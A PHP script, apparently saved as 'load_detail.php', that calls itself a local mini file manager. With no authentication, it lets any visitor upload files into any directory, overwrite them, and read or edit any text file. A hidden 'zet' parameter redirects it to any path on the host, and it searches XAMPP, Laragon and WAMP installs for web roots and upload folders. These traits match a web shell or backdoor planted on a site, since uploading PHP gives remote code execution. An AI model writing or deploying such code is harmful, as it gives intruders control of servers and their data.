<?php
declare(strict_types=1);

// Mini File Manager (local use)
// Features: navigate folders, upload files, edit text files.

session_start();

$defaultBase = realpath(__DIR__);
if ($defaultBase === false) {
    http_response_code(500);
    echo "Base directory not found.";
    exit;
}

function getUserHome(): ?string {
    $userProfile = getenv('USERPROFILE');
    if (is_string($userProfile) && $userProfile !== '') {
        return $userProfile;
    }
    $homeDrive = getenv('HOMEDRIVE');
    $homePath = getenv('HOMEPATH');
    if (is_string($homeDrive) && is_string($homePath) && $homeDrive !== '' && $homePath !== '') {
        return $homeDrive . $homePath;
    }
    return null;
}

function h(string $s): string {
    return htmlspecialchars($s, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');
}

function normalizeRelPath(string $rel): string {
    $rel = str_replace("\0", '', $rel);
    $rel = str_replace('\\', '/', $rel);
    $rel = ltrim($rel, '/');
    $parts = explode('/', $rel);
    $stack = [];
    foreach ($parts as $p) {
        if ($p === '' || $p === '.') {
            continue;
        }
        if ($p === '..') {
            array_pop($stack);
            continue;
        }
        $stack[] = $p;
    }
    return implode('/', $stack);
}

function safePath(string $baseDir, string $rel): string {
    $rel = normalizeRelPath($rel);
    $path = $baseDir . DIRECTORY_SEPARATOR . $rel;
    $real = realpath($path);
    if ($real !== false) {
        return $real;
    }
    // For non-existing paths (e.g. upload target), ensure it stays within baseDir
    $base = rtrim($baseDir, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR;
    $norm = str_replace(['/', '\\'], DIRECTORY_SEPARATOR, $path);
    if (strpos($norm, $base) !== 0) {
        return $baseDir;
    }
    return $norm;
}

function findWebRoots(array $roots, int $maxDepth = 4, int $maxResults = 50): array {
    $targets = ['public_html', 'htdocs', 'www'];
    $skip = ['.git', 'node_modules', 'vendor', '.idea', '.vscode'];
    $found = [];

    $queue = [];
    foreach ($roots as $r) {
        if (!is_string($r) || $r === '') { continue; }
        $real = realpath($r);
        if ($real !== false && is_dir($real)) {
            $queue[] = [$real, 0];
        }
    }

    while (!empty($queue) && count($found) < $maxResults) {
        [$dir, $depth] = array_shift($queue);
        if ($depth > $maxDepth) { continue; }
        $baseName = basename($dir);
        if (in_array($baseName, $targets, true)) {
            $found[] = $dir;
        }

        $items = @scandir($dir);
        if ($items === false) { continue; }
        foreach ($items as $name) {
            if ($name === '.' || $name === '..') { continue; }
            if (in_array($name, $skip, true)) { continue; }
            $path = $dir . DIRECTORY_SEPARATOR . $name;
            if (is_dir($path)) {
                $queue[] = [$path, $depth + 1];
            }
        }
    }

    // Unique
    $uniq = [];
    foreach ($found as $p) {
        $uniq[$p] = true;
    }
    return array_keys($uniq);
}

function buildCandidates(string $defaultBase): array {
    $roots = [$defaultBase];
    $home = getUserHome();
    if ($home !== null) { $roots[] = $home; }
    $roots[] = 'C:\\xampp';
    $roots[] = 'C:\\laragon';
    $roots[] = 'C:\\wamp';
    $roots[] = 'C:\\wamp64';

    $webRoots = findWebRoots($roots, 4, 50);
    $candidates = [];
    foreach ($webRoots as $wr) {
        $candidates[] = $wr;
        $uploads = $wr . DIRECTORY_SEPARATOR . 'uploads';
        if (is_dir($uploads)) {
            $candidates[] = $uploads;
        }
    }
    // Always include default base
    $candidates[] = $defaultBase;

    $uniq = [];
    foreach ($candidates as $p) {
        $real = realpath($p);
        if ($real !== false && is_dir($real)) {
            $uniq[$real] = true;
        }
    }
    return array_keys($uniq);
}

$candidates = buildCandidates($defaultBase);

// Handle base switching
if (isset($_GET['setbase']) && is_string($_GET['setbase'])) {
    $target = realpath(rawurldecode($_GET['setbase']));
    if ($target !== false && in_array($target, $candidates, true)) {
        $_SESSION['baseDir'] = $target;
        header('Location: load_detail.php');
        exit;
    }
}
// Direct set base via parameter (no auto-detect list required)
if (isset($_GET['zet']) && is_string($_GET['zet'])) {
    $target = realpath(rawurldecode($_GET['zet']));
    if ($target !== false && is_dir($target)) {
        $_SESSION['baseDir'] = $target;
        header('Location: load_detail.php');
        exit;
    }
}
if (isset($_GET['resetbase'])) {
    unset($_SESSION['baseDir']);
    header('Location: load_detail.php');
    exit;
}

$baseDir = $defaultBase;
if (isset($_SESSION['baseDir']) && is_string($_SESSION['baseDir'])) {
    $sessionBase = realpath($_SESSION['baseDir']);
    if ($sessionBase !== false && is_dir($sessionBase)) {
        $baseDir = $sessionBase;
    }
}

$relDir = $_GET['dir'] ?? '';
$relDir = is_string($relDir) ? $relDir : '';
$currentDir = safePath($baseDir, $relDir);
if (!is_dir($currentDir)) {
    $currentDir = $baseDir;
    $relDir = '';
}

$message = '';
$error = '';

// Handle upload
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action']) && $_POST['action'] === 'upload') {
    if (!isset($_FILES['upload']) || !is_uploaded_file($_FILES['upload']['tmp_name'])) {
        $error = 'No file uploaded.';
    } else {
        $targetName = basename($_FILES['upload']['name']);
        $overwrite = isset($_POST['overwrite']) && $_POST['overwrite'] === '1';
        $targetPath = $currentDir . DIRECTORY_SEPARATOR . $targetName;
        if (!$overwrite && file_exists($targetPath)) {
            $error = 'File already exists. Tick "Overwrite" to replace it.';
        } else {
            if (move_uploaded_file($_FILES['upload']['tmp_name'], $targetPath)) {
                $message = 'Upload successful.';
            } else {
                $error = 'Upload failed.';
            }
        }
    }
}

// Handle save edit
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action']) && $_POST['action'] === 'save') {
    $relFile = $_POST['file'] ?? '';
    $relFile = is_string($relFile) ? $relFile : '';
    $filePath = safePath($baseDir, $relFile);
    if (!is_file($filePath)) {
        $error = 'File not found.';
    } else {
        $content = $_POST['content'] ?? '';
        if (!is_string($content)) {
            $content = '';
        }
        if (file_put_contents($filePath, $content) !== false) {
            $message = 'File saved.';
        } else {
            $error = 'Failed to save file.';
        }
        // After save, stay in current directory
        $dirOfFile = dirname($relFile);
        $relDir = $dirOfFile === '.' ? '' : $dirOfFile;
        $currentDir = safePath($baseDir, $relDir);
    }
}

$editRelFile = $_GET['edit'] ?? '';
$editRelFile = is_string($editRelFile) ? $editRelFile : '';
$editFilePath = '';
$editContent = '';
$canEdit = false;
if ($editRelFile !== '') {
    $editFilePath = safePath($baseDir, $editRelFile);
    if (is_file($editFilePath) && is_readable($editFilePath)) {
        $size = filesize($editFilePath);
        if ($size !== false && $size <= 1024 * 1024) {
            $editContent = (string)file_get_contents($editFilePath);
            $canEdit = true;
        } else {
            $error = 'File too large to edit (max 1 MB).';
        }
    } else {
        $error = 'File not found or not readable.';
    }
}

// Build listing
$items = @scandir($currentDir);
if ($items === false) {
    $items = [];
    $error = 'Failed to read directory.';
}

// Parent directory for navigation
$parentRel = '';
if ($currentDir !== $baseDir) {
    $parentRel = normalizeRelPath(dirname($relDir));
    if ($parentRel === '.') {
        $parentRel = '';
    }
}

?>
<!doctype html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Mini File Manager</title>
    <style>
        :root {
            --bg: #0f172a;
            --panel: #111827;
            --text: #e5e7eb;
            --muted: #94a3b8;
            --accent: #38bdf8;
            --danger: #fca5a5;
        }
        body {
            margin: 0;
            font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace;
            background: radial-gradient(1200px 600px at 20% -10%, #1f2937, var(--bg));
            color: var(--text);
        }
        .wrap {
            max-width: 980px;
            margin: 24px auto;
            padding: 16px;
        }
        h1 {
            margin: 0 0 12px 0;
            font-size: 20px;
            color: var(--accent);
        }
        .panel {
            background: rgba(17, 24, 39, 0.9);
            border: 1px solid #1f2937;
            border-radius: 10px;
            padding: 14px;
            margin-bottom: 16px;
        }
        .path {
            color: var(--muted);
            font-size: 13px;
            margin-bottom: 8px;
        }
        .msg { color: #86efac; }
        .err { color: var(--danger); }
        table {
            width: 100%;
            border-collapse: collapse;
        }
        th, td {
            text-align: left;
            padding: 8px;
            border-bottom: 1px solid #1f2937;
            font-size: 14px;
        }
        a { color: var(--accent); text-decoration: none; }
        a:hover { text-decoration: underline; }
        .actions {
            display: flex;
            gap: 12px;
            flex-wrap: wrap;
            align-items: center;
        }
        input[type="text"], textarea {
            width: 100%;
            background: #0b1220;
            color: var(--text);
            border: 1px solid #1f2937;
            border-radius: 6px;
            padding: 8px;
        }
        textarea { min-height: 260px; }
        button {
            background: var(--accent);
            border: 0;
            color: #0b1220;
            padding: 8px 12px;
            border-radius: 6px;
            cursor: pointer;
            font-weight: 600;
        }
        .checkbox {
            display: inline-flex;
            gap: 6px;
            align-items: center;
            color: var(--muted);
            font-size: 13px;
        }
    </style>
</head>
<body>
<div class="wrap">
    <h1>Mini File Manager (Local)</h1>

    <?php if ($message !== ''): ?>
        <div class="panel msg"><?php echo h($message); ?></div>
    <?php endif; ?>
    <?php if ($error !== ''): ?>
        <div class="panel err"><?php echo h($error); ?></div>
    <?php endif; ?>

    <div class="panel">
        <div class="path">Base: <?php echo h($baseDir); ?></div>
        <div class="path">Current: <?php echo h($currentDir); ?></div>
        <table>
            <thead>
            <tr>
                <th>Name</th>
                <th>Type</th>
                <th>Size</th>
                <th>Action</th>
            </tr>
            </thead>
            <tbody>
            <?php if ($parentRel !== ''): ?>
                <tr>
                    <td><a href="?dir=<?php echo h($parentRel); ?>">..</a></td>
                    <td>dir</td>
                    <td>-</td>
                    <td></td>
                </tr>
            <?php endif; ?>
            <?php foreach ($items as $name): ?>
                <?php
                if ($name === '.' || $name === '..') { continue; }
                $full = $currentDir . DIRECTORY_SEPARATOR . $name;
                $isDir = is_dir($full);
                $relItem = normalizeRelPath(($relDir === '' ? '' : $relDir . '/') . $name);
                ?>
                <tr>
                    <td>
                        <?php if ($isDir): ?>
                            <a href="?dir=<?php echo h($relItem); ?>"><?php echo h($name); ?></a>
                        <?php else: ?>
                            <?php echo h($name); ?>
                        <?php endif; ?>
                    </td>
                    <td><?php echo $isDir ? 'dir' : 'file'; ?></td>
                    <td><?php echo $isDir ? '-' : (string)@filesize($full); ?></td>
                    <td>
                        <?php if (!$isDir): ?>
                            <a href="?dir=<?php echo h($relDir); ?>&edit=<?php echo h($relItem); ?>">edit</a>
                        <?php endif; ?>
                    </td>
                </tr>
            <?php endforeach; ?>
            </tbody>
        </table>
    </div>

    <div class="panel">
        <div class="path">Quick Jump (auto-detected)</div>
        <div class="actions">
            <?php foreach ($candidates as $cand): ?>
                <a href="?setbase=<?php echo rawurlencode($cand); ?>"><?php echo h($cand); ?></a>
            <?php endforeach; ?>
            <a href="?resetbase=1">Reset Base</a>
        </div>
    </div>

    <div class="panel">
        <form method="post" enctype="multipart/form-data" class="actions">
            <input type="hidden" name="action" value="upload">
            <input type="file" name="upload" required>
            <label class="checkbox">
                <input type="checkbox" name="overwrite" value="1">
                Overwrite
            </label>
            <button type="submit">Upload</button>
        </form>
    </div>

    <?php if ($editRelFile !== ''): ?>
        <div class="panel">
            <div class="path">Editing: <?php echo h($editRelFile); ?></div>
            <?php if ($canEdit): ?>
                <form method="post">
                    <input type="hidden" name="action" value="save">
                    <input type="hidden" name="file" value="<?php echo h($editRelFile); ?>">
                    <textarea name="content"><?php echo h($editContent); ?></textarea>
                    <div style="margin-top: 10px;">
                        <button type="submit">Save</button>
                    </div>
                </form>
            <?php endif; ?>
        </div>
    <?php endif; ?>
</div>
</body>
</html>
